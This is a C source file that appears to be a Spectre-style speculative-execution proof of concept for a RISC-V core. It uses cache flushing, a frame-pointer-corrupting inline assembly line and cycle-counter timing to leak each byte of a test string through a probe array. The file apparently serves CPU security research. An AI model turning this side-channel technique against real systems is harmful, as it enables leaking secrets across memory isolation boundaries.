#include <stdio.h>
#include <stdint.h>
#include "cache.h"
#include "encoding.h"

#define ATTACK_SAME_ROUNDS 10 
#define SECRET_SZ 26
#define CACHE_HIT_THRESHOLD 50

uint8_t attackArray[256 * L1_BLOCK_SZ_BYTES];
char* secretString = "ThisIsPrimitiveAttack3Test";

void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

void specFunc(char *addr){
    extern void frameDump();
    uint64_t dummy = 0;
    frameDump();
    char secret = *addr;
    dummy = attackArray[secret * L1_BLOCK_SZ_BYTES];
    dummy = rdcycle();
}

int main(void){
    uint64_t start, diff;
    uint8_t dummy = 0;
    static uint64_t results[256];

    printf("the secret key is:%s \n", secretString);

    for (uint64_t offset = 0; offset < SECRET_SZ; ++offset){
        
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
            flushCache((uint64_t)attackArray, sizeof(attackArray));
            specFunc(secretString + offset);
            __asm__ volatile ("ld fp, -16(sp)");
            for (uint64_t i = 0; i < 256; ++i){
                start = rdcycle();
                dummy &= attackArray[i * L1_BLOCK_SZ_BYTES];
                diff = (rdcycle() - start);
                if ( diff < CACHE_HIT_THRESHOLD ){
                    results[i] += 1;
                }
            }

        }
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);
	    printf("m[0x%p] = offset(%lu) = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(secretString + offset), offset, secretString[offset], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]);
    }
}
